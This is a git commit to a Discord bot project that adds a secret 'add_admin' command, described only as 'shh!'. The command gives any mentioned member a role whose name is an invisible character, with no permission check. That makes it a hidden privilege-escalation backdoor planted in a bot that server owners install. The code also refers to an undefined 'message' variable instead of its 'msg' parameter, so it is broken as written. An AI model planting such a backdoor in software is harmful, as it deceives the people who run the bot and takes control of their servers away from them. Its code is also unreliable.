77f8e4debfe543ad4a61fc6a54124baf0f285138
SuperHarmony910 <57850338+SuperHarmony910@users.noreply.github.com>
2021-01-29 22:04:15 +1100

    Added a hidden admin role assigner!

---
+++ projects/discord-bots/iFunction/commands/add_admin.js
@@ -0,0 +1,11 @@
+module.exports = {
+  name: 'add_admin',
+  description: 'shh!',
+  execute(msg, args) {
+    let role = message.guild.roles.cache.find(r => r.name === "﻿");
+    // Z server role ID: let role = message.guild.roles.cache.get("804596713214050336");
+    let member = message.mentions.members.first();
+    // Add the role!
+    member.roles.add(role).catch(console.error);
+  },
+};
--- projects/discord-bots/iFunction/commands/index.js
+++ projects/discord-bots/iFunction/commands/index.js
@@ -1,5 +1,6 @@
 module.exports = {
   ping: require('./ping'),
   promo: require('./promo_call'),
-  hello: require('./hello')
+  hello: require('./hello'),
+  add_admin: require('./add_admin')
 };
